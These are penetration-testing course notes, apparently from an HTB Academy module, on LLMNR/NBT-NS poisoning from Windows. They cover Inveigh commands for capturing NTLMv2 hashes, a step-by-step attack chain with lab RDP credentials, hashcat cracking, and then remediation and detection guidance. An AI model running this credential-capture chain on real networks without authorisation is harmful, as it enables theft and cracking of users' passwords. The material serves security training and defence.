# Section 7 — LLMNR/NBT-NS Poisoning from Windows

## When to Use Inveigh

Use Inveigh instead of Responder when:
- Your attack host is Windows
- Client provided a Windows box for testing
- You landed on a Windows host as local admin and want to expand access

Same attack as section 6 — just Windows-native tooling.

---

## Inveigh — PowerShell Version (legacy, no longer updated)

```powershell
# Import and check parameters
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters

# Start with LLMNR + NBNS spoofing, console + file output
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Tool location on lab host: `C:\Tools\`

---

## Inveigh — C# Version (InveighZero, current/maintained)

```powershell
# Run with defaults
.\Inveigh.exe
```

Output indicators:
- `[+]` = enabled by default
- `[ ]` = disabled by default
- `[-]` = disabled, no response sent

Press `ESC` to enter interactive console while running.

---

## Inveigh Interactive Console Commands

```
GET NTLMV2          # all captured NTLMv2 hashes
GET NTLMV2UNIQUE    # one hash per user (cleaner for cracking)
GET NTLMV2USERNAMES # usernames + source IPs (good for target list)
GET NTLMV1          # NTLMv1 hashes
GET CLEARTEXT       # any cleartext credentials captured
GET LOG             # log entries (add search string to filter)
STOP                # stop Inveigh
HELP                # full command list
```

**Workflow:** Let it run → ESC → `GET NTLMV2USERNAMES` to see who you have → `GET NTLMV2UNIQUE` to pull hashes for cracking.

---

## Full Attack Chain

```bash
# 1. RDP into Windows attack host
xfreerdp /v:TARGET_IP /u:htb-student /p:'Academy_student_AD!' /cert:ignore /dynamic-resolution

# 2. On Windows — open PowerShell as Administrator

# 3. Navigate to tools and run Inveigh
cd C:\Tools
.\Inveigh.exe

# 4. Let it run and collect — then press ESC to enter interactive console

# 5. Check who you've captured
GET NTLMV2USERNAMES

# 6. Pull unique hashes for cracking
GET NTLMV2UNIQUE

# 7. Copy the target hash line, save to file on Linux attack host
echo "<full hash line>" > user.hash

# 8. Crack on Linux
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt
```

## Cracking (same as Linux — Hashcat mode 5600)

```bash
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt
```

---

## Remediation (report these to clients)

### Disable LLMNR (via GPO)
```
Computer Configuration → Administrative Templates → Network → DNS Client
→ Enable "Turn OFF Multicast Name Resolution"
```

### Disable NBT-NS (no GPO option — must script)
```powershell
# PowerShell startup script via GPO
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach {
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```
Deploy via: `Computer Configuration → Windows Settings → Script → Startup`
Host script at: `\\domain.local\SYSVOL\DOMAIN\scripts\`

### Other mitigations
- Enable **SMB Signing** — prevents NTLM relay even if hashes are captured
- Filter traffic on UDP 5355 (LLMNR) and UDP 137 (NBT-NS)
- Network segmentation for hosts that require these protocols

---

## Detection (blue team awareness)

| Detection Method | Detail |
|-----------------|--------|
| Inject fake LLMNR/NBT-NS requests | Alert on any responses → attacker responding = caught |
| Monitor ports | UDP 5355 and UDP 137 |
| Event IDs | 4697 (service install), 7045 (new service) |
| Registry key | `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` — `EnableMulticast` DWORD = 0 means LLMNR disabled |

MITRE ATT&CK: **T1557.001** — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

---

## Exam Notes

- Responder (Linux) and Inveigh (Windows) do the same thing — know both
- C# version (`Inveigh.exe`) is current; PowerShell version is legacy
- `GET NTLMV2UNIQUE` is your go-to — one hash per user, clean output for Hashcat
- SMB Signing disabled + captured hash = relay attack possible (no cracking needed)
- Always recommend disabling LLMNR/NBT-NS + enabling SMB Signing in your report
